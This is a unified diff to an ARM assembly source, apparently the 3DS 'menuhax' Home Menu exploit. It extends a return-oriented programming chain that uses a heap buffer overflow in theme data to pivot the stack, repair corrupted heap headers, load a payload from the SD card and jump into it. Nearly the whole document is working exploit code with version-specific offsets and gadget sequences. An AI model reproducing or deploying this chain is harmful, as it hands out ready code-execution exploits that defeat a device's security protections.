@@ -5,7 +5,7 @@
 /*
 All function addresses referenced here are for v9.4 homemenu.
 
-The memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
+The CTRSDK memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
 After calling some func which decreases some counter, homemenu then executes L_1ca5d0(r4), where r4 is the above overwritten ptr.
 L_1ca5d0: This first writes u8 value 1 to 0x3b7e. After checking/using other state, this function eventually executes: L_1d1ea8(*(inr0+0x3a60), 1);//where inr0=above ptr
 L_1d1ea8: After using other state, it executes: return L_2441a0(*(inr0+0x2f0), inr1);
@@ -15,7 +15,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 //The addresses for the ROP-chain is from an include, see the Makefile gcc line with -include / README.
 
-#define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12
+#define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12-0x14
 
 #define ROP_BXR1 POP_R4LR_BXR1+4
 #define ROP_BXLR ROP_LDR_R0FROMR0+4 //"bx lr"
@@ -32,7 +32,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 	#if NEW3DS==0
 		#define CODEBINPAYLOAD_SIZE 0x4000
 	#else
-		#if (REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)//Check for system-version <v9.6.
+		#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)//Check for system-version <v9.6.
 			#define CODEBINPAYLOAD_SIZE 0x4000
 		#else
 			#define CODEBINPAYLOAD_SIZE 0x6000
@@ -151,13 +151,13 @@ ROP_SETLR ROP_POPPC
 .word POP_R1PC
 .word (ORIGINALOBJPTR_BASELOADADR+8) @ r1
 
-.word ROP_LDRR1R1_STRR1R0 @ Restore the saved r4 value overwritten by memchunkhax with the original value.
+.word ROP_LDRR1R1_STRR1R0 @ Write the original value for r4, to the location used for loading r4 from on stack @ RET2MENU.
 .endm
 
 .macro RET2MENUCODE
 PREPARE_RET2MENUCODE
 
-ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4R5R6PC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
+ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4FPPC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
 .endm
 
 .macro COND_THROWFATALERR
@@ -166,6 +166,66 @@ ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4R5R6PC @ Begin the stack-piv
 .word 0 @ r3
 .word 0 @ r4
 .word 0 @ r5
+.endm
+
+.macro ROPMACRO_CMPDATA cmpaddr, cmpword, stackaddr_cmpmismatch, stackaddr_cmpmatch
+.word POP_R0PC
+.word HEAPBUF + ((. + 0x14) - _start) @ r0
+
+.word POP_R1PC
+.word \cmpaddr @ r1
+
+.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *cmpaddr to ROPMACRO_CMPDATA_cmpword.
+
+.word POP_R0PC
+//ROPMACRO_CMPDATA_cmpword:
+.word 0 @ r0
+
+.word POP_R1PC
+.word \cmpword @ r1
+
+.word ROP_CMPR0R1 @ Compare current PAD state with USE_PADCHECK value.
+
+.word HEAPBUF + ((object+0x20) - _start) @ r4
+
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_sploadword - _start) @ r0
+
+.word POP_R1PC
+.word \stackaddr_cmpmismatch @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
+
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
+
+.word POP_R1PC
+.word ROP_POPPC @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
+
+.word POP_R0PC @ Begin the actual stack-pivot ROP.
+.word HEAPBUF + (object - _start) @ r0
+
+.word ROP_LOADR4_FROMOBJR0+8 @ When the value at cmpaddr matches cmpword, continue the ROP, otherwise do the above stack-pivot.
+
+.word 0, 0, 0 @ r4..r6
+
+.if \stackaddr_cmpmatch
+ROPMACRO_STACKPIVOT \stackaddr_cmpmatch, ROP_POPPC
+.endif
+.endm
+
+.macro ROPMACRO_WRITEWORD addr, value
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word \addr @ r0
+
+.word POP_R1PC
+.word \value @ r1
+
+.word ROP_STR_R1TOR0
 .endm
 
 _start:
@@ -179,6 +239,11 @@ themeheader:
 .incbin THEMEDATA_PATH
 #endif
 #else
+
+#ifdef PAYLOAD_HEADERFILE
+.incbin PAYLOAD_HEADERFILE
+#endif
+
 .word POP_R0PC @ Stack-pivot to ropstackstart.
 .word HEAPBUF + (object - _start) @ r0
 
@@ -206,28 +271,16 @@ stackpivot_pcloadword:
 .space ((object + 0x28) - .)
 .word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.
 
-.space ((object + 0x2ec) - .)
-#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && MENUVERSION>12288) //Dunno if this applies for versions other than v9.2.
-.word 0 @ The target ptr offset is 0x4-bytes different from v9.2.
-#endif
-.word HEAPBUF + (object - _start) @ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.
-
-.space ((object + 0x3a60) - .)
-#if (REGIONVAL==0 && MENUVERSION<=15360) || (REGIONVAL!=0 && MENUVERSION<=12288) //Dunno if this applies for versions other than v9.2.
-.word 0 @ The target ptr offset is 0x4-bytes different from v9.4.
-#endif
-#if (REGIONVAL==0 && MENUVERSION>=19476) || (REGIONVAL!=0 && MENUVERSION>=16404) //Check for system-version v9.6.
-.space 0x40
-#endif
-.word HEAPBUF + (object - _start) @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.
+@ Fill memory with the ptrs used by the following:
+@ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.
+@ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.
+.fill (((object + 0x3a60 + 0x100) - .) / 4), 4, (HEAPBUF + (object - _start))
 
 vtable:
 .word 0, 0 @ vtable+0
 .word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
 .word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
 .word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20
-
-.space ((vtable + 0x100) - .)
 
 .space ((object + 0x4000) - .) @ Base the tmpdata followed by stack, at heapbuf+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).
 
@@ -273,17 +326,264 @@ sdfile_path:
 .align 2
 #else
 sdfile_ropbin_path:
-.string16 "sd:/menuhax_ropbinpayload.bin"
+.string16 ROPBINPAYLOAD_PATH
 .align 2
 #endif
+#endif
+
+#ifdef LOADSDCFG_PADCHECK
+sdfile_padcfg_path:
+.string16 "sd:/menuhax_padcfg.bin"
+.align 2
+#endif
+
+#ifdef ENABLE_IMAGEDISPLAY
+#ifdef ENABLE_IMAGEDISPLAY_SD
+sdfile_imagedisplay_path:
+.string16 "sd:/menuhax_imagedisplay.bin"
+.align 2
+#endif
+#endif
+
+#ifdef LOADSDCFG_PADCHECK
+sdcfg_pad:
+.space 0x10
+#endif
+
+#ifdef LOADOTHER_THEMEDATA
+filepath_theme_stringblkstart:
+@ Originally these strings used the "sd:/" archive opened by the below ROP, but that's rather pointless since the BGM gets read from the normal extdata path anyway.
+
+#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYRD
+filepath_theme_shuffle_bodyrd:
+.string16 "theme:/yodyCache_rd.bin"
+.align 2
+#endif
+
+#ifdef FILEPATHPTR_THEME_REGULAR_THEMEMANAGE
+filepath_theme_regular_thememanage:
+.string16 "theme:/yhemeManage.bin"
+.align 2
+#endif
+
+#ifdef FILEPATHPTR_THEME_REGULAR_BODYCACHE
+filepath_theme_regular_bodycache:
+.string16 "theme:/yodyCache.bin"
+.align 2
+#endif
+
+/*filepath_theme_regular_bgmcache:
+.string16 "sd:/BgmCache.bin"
+.align 2*/
+
+#ifdef FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE
+filepath_theme_shuffle_thememanage:
+.string16 "theme:/yhemeManage_%02d.bin"
+.align 2
+#endif
+
+#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYCACHE
+filepath_theme_shuffle_bodycache:
+.string16 "theme:/yodyCache_%02d.bin"
+.align 2
+#endif
+
+/*filepath_theme_shuffle_bgmcache:
+.string16 "sd:/BgmCache_%02d.bin"
+.align 2*/
+
+filepath_theme_stringblkend:
 #endif
 
 tmp_scratchdata:
 .space 0x400
 
 ropstackstart:
+#ifdef LOADSDPAYLOAD
+CALLFUNC_NOSP FS_MountSdmc, (HEAPBUF + (sd_archivename - _start)), 0, 0, 0
+#endif
+
 #ifdef USE_PADCHECK
 PREPARE_RET2MENUCODE
+
+@ The below adds the saved LR value on stack used during RET2MENU, with a certain value. This basically subtracts the saved LR so that a function which was previously only executed with the themehax state, gets executed again with the real state this time. Without this, this particular function never gets executed with normal state, which broke various things.
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word (HEAPBUF + (rop_ret2menu_stack_lrval - _start)) @ r0
+
+.word POP_R1PC
+.word TARGETOVERWRITE_STACKADR+0x20 @ r1
+
+.word ROP_LDRR1R1_STRR1R0 @ Copy the saved LR value on the stack which gets used during RET2MENU, to rop_ret2menu_stack_lrval.
+
+.word POP_R0PC
+rop_ret2menu_stack_lrval:
+.word 0
+
+.word POP_R1PC
+#ifndef LOADOTHER_THEMEDATA
+
+#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && REGIONVAL!=4 && MENUVERSION>12288) || (REGIONVAL==4)//Check for system-version >v9.2.
+.word 0xfffffff4
+#else
+.word 0xfffffff8
+#endif
+
+#else
+
+@ In addition to what was described above, rerun the theme-loading code during RET2MENU with this.
+#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && REGIONVAL!=4 && MENUVERSION>12288) || (REGIONVAL==4)//Check for system-version >v9.2.
+.word 0xfffffeac
+#else
+.word 0xffffffd4
+#endif
+
+#endif
+
+.word ROP_ADDR0_TO_R1 @ r0 = rop_ret2menu_stack_lrval + <above r1 value>
+
+.word POP_R1PC
+.word (HEAPBUF + (rop_ret2menu_stack_newlrval - _start))
+
+.word ROP_STR_R0TOR1 @ Write the above r0 value to rop_ret2menu_stack_newlrval.
+
+.word POP_R0PC
+.word TARGETOVERWRITE_STACKADR+0x20 @ r0
+
+.word POP_R1PC
+rop_ret2menu_stack_newlrval:
+.word 0 @ r1
+
+.word ROP_STR_R1TOR0 @ Write the new LR value to the stack.
+
+@ Restore the heap freemem memchunk header following the buffer on the heap, to what it was prior to being overwritten @ buf overflow.
+#ifdef FIXHEAPBUF
+ROPMACRO_WRITEWORD (FIXHEAPBUF+0x2a0000 + 0x8), 0x0
+ROPMACRO_WRITEWORD (FIXHEAPBUF+0x2a0000 + 0xc), 0x0
+
+@ Write the below value to a heapctx state ptr, which would've been the addr value located there if the memchunk wasn't overwritten, after the memfree was done.
+ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80+0x40002c + 0x3c + 0x4), (HEAPBUF-0x58)
+
+@ Write the below value to a freemem memchunk header ptr, which would've been the addr value located there if the memchunk wasn't overwritten(the one targeted in the buf overflow), after the memfree  was done.
+#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)//Check for system-version <v9.6.
+ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80 + (0x10+0xc)), 0x0
+#else
+ROPMACRO_WRITEWORD (FIXHEAPBUF-0x80 + (0x28+0xc)), 0x0
+#endif
+#endif
+
+#ifdef LOADOTHER_THEMEDATA
+@ Write value 0x0 to the value which will get popped into r6 @ RET2MENU ROP.
+ROPMACRO_WRITEWORD TARGETOVERWRITE_STACKADR+0x8, 0x0
+
+@ Copy the theme filepath strings to 0x0fff0000.
+CALLFUNC_NOSP MEMCPY, 0x0fff0000, (HEAPBUF + ((filepath_theme_stringblkstart) - _start)), (filepath_theme_stringblkend - filepath_theme_stringblkstart), 0
+
+@ Overwrite the string ptrs in Home Menu .data which are used for the theme extdata filepaths. Don't touch the BGM paths, since those don't get used for reading during theme-load anyway.
+#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYRD
+ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_BODYRD, (0x0fff0000 + (filepath_theme_shuffle_bodyrd - filepath_theme_stringblkstart))
+#endif
+
+#ifdef FILEPATHPTR_THEME_REGULAR_THEMEMANAGE
+ROPMACRO_WRITEWORD FILEPATHPTR_THEME_REGULAR_THEMEMANAGE, (0x0fff0000 + (filepath_theme_regular_thememanage - filepath_theme_stringblkstart))
+#endif
+
+#ifdef FILEPATHPTR_THEME_REGULAR_BODYCACHE
+ROPMACRO_WRITEWORD FILEPATHPTR_THEME_REGULAR_BODYCACHE, (0x0fff0000 + (filepath_theme_regular_bodycache - filepath_theme_stringblkstart))
+#endif
+
+//ROPMACRO_WRITEWORD (0x32e604+0x10), (0x0fff0000 + (filepath_theme_regular_bgmcache - filepath_theme_stringblkstart))
+
+#ifdef FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE
+ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE, (0x0fff0000 + (filepath_theme_shuffle_thememanage - filepath_theme_stringblkstart))
+#endif
+
+#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYCACHE
+ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_BODYCACHE, (0x0fff0000 + (filepath_theme_shuffle_bodycache - filepath_theme_stringblkstart))
+#endif
+
+//ROPMACRO_WRITEWORD (0x32e604+0x1c), (0x0fff0000 + (filepath_theme_shuffle_bgmcache - filepath_theme_stringblkstart))
+#endif
+
+#ifdef LOADSDCFG_PADCHECK
+@ Load the cfg file. Errors are ignored with file-reading.
+CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
+
+CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_padcfg_path - _start)), 1, 0
+
+CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (sdcfg_pad - _start)), 0x10
+
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word (HEAPBUF + (IFile_ctx - _start))
+
+.word ROP_LDR_R0FROMR0
+
+.word IFile_Close
+
+rop_padcfg_cmpbegin1: @ Compare u32 filebuf+0 with 0x1, on match continue to the ROP following this, otherwise jump to rop_padcfg_cmpbegin2.
+ROP_SETLR ROP_POPPC
+
+ROPMACRO_CMPDATA (HEAPBUF + (sdcfg_pad - _start)), 0x1, (HEAPBUF + (rop_padcfg_cmpbegin2 - _start)), 0x0
+
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word (HEAPBUF + (rop_r1data_cmphid - _start)) @ r0
+
+.word POP_R1PC
+.word (HEAPBUF + ((sdcfg_pad+0x4) - _start)) @ r1
+
+.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from filebuf+0x4 to rop_r1data_cmphid, for overwriting the USE_PADCHECK value.
+
+@ This ROP chunk has finished, jump to rop_padcfg_end.
+ROPMACRO_STACKPIVOT (HEAPBUF + (rop_padcfg_end - _start)), ROP_POPPC
+
+rop_padcfg_cmpbegin2: @ Compare u32 filebuf+0 with 0x2, on match continue to the ROP following this, otherwise jump to rop_padcfg_end.
+ROP_SETLR ROP_POPPC
+
+ROPMACRO_CMPDATA (HEAPBUF + (sdcfg_pad - _start)), 0x2, (HEAPBUF + (rop_padcfg_end - _start)), 0x0
+
+@ This type is the same as type1(minus the offset the PAD value is loaded from), except that it basically inverts the padcheck: on PAD match ret2menu, on mismatch continue ROP.
+
+.word POP_R0PC
+.word (HEAPBUF + (rop_r1data_cmphid - _start)) @ r0
+
+.word POP_R1PC
+.word (HEAPBUF + ((sdcfg_pad+0x8) - _start)) @ r1
+
+.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from filebuf+0x8 to rop_r1data_cmphid, for overwriting the USE_PADCHECK value.
+
+.word POP_R0PC
+.word (HEAPBUF + ((padcheck_end_stackpivotskip) - _start)) @ r0
+
+.word POP_R1PC
+.word ROP_POPPC @ r1
+
+.word ROP_STR_R1TOR0 @ Write ROP_POPPC to padcheck_end_stackpivotskip, so that the stack-pivot following that actually gets executed.
+
+.word POP_R0PC
+.word (HEAPBUF + ((padcheck_pc_value) - _start)) @ r0
+
+.word POP_R1PC
+.word ROP_POPPC @ r1
+
+.word ROP_STR_R1TOR0 @ Write ROP_POPPC to padcheck_pc_value.
+
+.word POP_R0PC
+.word (HEAPBUF + ((padcheck_sp_value) - _start)) @ r0
+
+.word POP_R1PC
+.word (HEAPBUF + ((padcheck_finish) - _start)) @ r1
+
+.word ROP_STR_R1TOR0 @ Write the address of padcheck_finish to padcheck_sp_value.
+
+rop_padcfg_end:
+#endif
+
+ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
 .word HEAPBUF + (rop_r0data_cmphid - _start) @ r0
@@ -298,12 +598,39 @@ rop_r0data_cmphid:
 .word 0 @ r0
 
 .word POP_R1PC
+rop_r1data_cmphid:
 .word USE_PADCHECK @ r1
 
 .word ROP_CMPR0R1 @ Compare current PAD state with USE_PADCHECK value.
 
 .word HEAPBUF + ((object+0x20) - _start) @ r4
 
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_sploadword - _start) @ r0
+
+.word POP_R1PC
+padcheck_sp_value:
+.word TARGETOVERWRITE_STACKADR @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
+
+.word POP_R0PC
+.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
+
+.word POP_R1PC
+padcheck_pc_value:
+.word POP_R4FPPC @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
+
+.word POP_R0PC @ Begin the actual stack-pivot ROP.
+.word HEAPBUF + (object - _start) @ r0
+
+.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the USE_PADCHECK value, continue the ROP, otherwise do the above stack-pivot to return to the home-menu code.
+
+.word 0, 0, 0 @ r4..r6
+
+@ Re-init the stack-pivot data since this is needed for the sdcfg stuff.
 .word POP_R0PC
 .word HEAPBUF + (stackpivot_sploadword - _start) @ r0
 
@@ -316,20 +643,50 @@ rop_r0data_cmphid:
 .word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
 
 .word POP_R1PC
-.word POP_R4R5R6PC @ r1
+.word POP_R4FPPC @ r1
 
 .word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
 
-.word POP_R0PC @ Begin the actual stack-pivot ROP.
+padcheck_end_stackpivotskip:
+.word POP_R4R5R6PC @ Jump down to the padcheck_finish ROP by default. The LOADSDCFG_PADCHECK ROP can patch this word to ROP_POPPC, so that the below stack-pivot actually gets executed.
+
+@ When actually executed, stack-pivot so that ret2menu is done.
+.word POP_R0PC
 .word HEAPBUF + (object - _start) @ r0
 
-.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the USE_PADCHECK value, continue the ROP, otherwise do the above stack-pivot to return to the home-menu code.
+.word ROP_LOADR4_FROMOBJR0
 
-.word 0, 0, 0 @ r4..r6
+padcheck_finish:
 #endif
 
-//Overwrite the top-screen framebuffers. This doesn't affect the framebuffers when returning from an appet to Home Menu.
+//Overwrite the top-screen framebuffers. This doesn't affect the framebuffers when returning from an appet to Home Menu. First chunk is 3D-left framebuffer, second one is 3D-right(when that's enabled). These are the primary framebuffers. Color format is byte-swapped RGB8.
+#ifndef ENABLE_IMAGEDISPLAY
 CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
+#else
+CALLFUNC_NOSP MEMCPY, (HEAPBUF + (_end - _start)), 0x1f000000, (0x46800*2), 0
+
+#ifdef ENABLE_IMAGEDISPLAY_SD
+CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
+
+CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_imagedisplay_path - _start)), 1, 0
+
+CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (_end - _start)), (0x46500)
+
+CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (_end - _start + 0x46800)), (0x46500)
+
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word (HEAPBUF + (IFile_ctx - _start))
+
+.word ROP_LDR_R0FROMR0
+
+.word IFile_Close
+#endif
+
+CALLFUNC_NOSP GSPGPU_FlushDataCache, (HEAPBUF + (_end - _start)), (0x46800*2), 0, 0
+CALL_GXCMD4 (HEAPBUF + (_end - _start)), 0x1f1e6000, 0x46800*2
+#endif
 
 #ifdef ENABLE_RET2MENU
 RET2MENUCODE
@@ -339,8 +696,7 @@ RET2MENUCODE
 #ifndef LOADSDPAYLOAD
 CALLFUNC_NOSP MEMCPY, ROPBIN_BUFADR, (HEAPBUF + ((codebinpayload_start) - _start)), (codedataend-codebinpayload_start), 0
 #else
-CALLFUNC_NOSP FS_MountSdmc, (HEAPBUF + (sd_archivename - _start)), 0, 0, 0
-COND_THROWFATALERR
+CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
 
 CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_ropbin_path - _start)), 1, 0
 COND_THROWFATALERR
@@ -357,6 +713,15 @@ ROP_SETLR ROP_POPPC
 
 .word IFile_Close
 #endif
+
+#ifdef ENABLE_HBLAUNCHER
+CALLFUNC_NOSP MEMSET32_OTHER, ROPBIN_BUFADR - (0x800*6), 0x2800, 0, 0 @ paramblk, the additional 0x2000-bytes is for backwards-compatibility.
+
+CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPBIN_BUFADR - (0x800*6), (0x10000+0x2800), 0, 0
+#endif
+
+@ Delay 3-seconds. This seems to help with the *hax 2.5 payload booting issues which triggered in some cases(doesn't happen as much with this).
+CALLFUNC_NOSP svcSleepThread, 3000000000, 0, 0, 0
 
 ROPMACRO_STACKPIVOT ROPBIN_BUFADR, ROP_POPPC
 #endif
@@ -427,8 +792,7 @@ CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0
 
 #ifndef ENABLE_LOADROPBIN
 #ifdef LOADSDPAYLOAD//When enabled, load the file from SD to codebinpayload_start.
-CALLFUNC_NOSP FS_MountSdmc, (HEAPBUF + (sd_archivename - _start)), 0, 0, 0
-COND_THROWFATALERR
+CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
 
 CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_path - _start)), 1, 0
 COND_THROWFATALERR
@@ -600,7 +964,7 @@ codedatastart:
 #if NEW3DS==0
 .space 0x200 @ nop-sled
 #else
-#if (REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)
+#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)
 .space 0x1000
 #else
 .space 0x3000 @ Size >=0x2000 is needed for SKATER >=v9.6(0x3000 for SKATER system-version v9.9), but doesn't work with the initial version of SKATER for whatever reason.
@@ -661,4 +1025,15 @@ codebinpayload_start:
 .align 4
 codedataend:
 .word 0
+
+.align 4
+_end:
+
+#ifdef PAYLOAD_PADFILESIZE
+.space (0x150000 - (_end - _start))
+#endif
+
+#ifdef PAYLOAD_FOOTER_WORDS
+.word PAYLOAD_FOOTER_WORD0, PAYLOAD_FOOTER_WORD1, PAYLOAD_FOOTER_WORD2, PAYLOAD_FOOTER_WORD3
+#endif
 
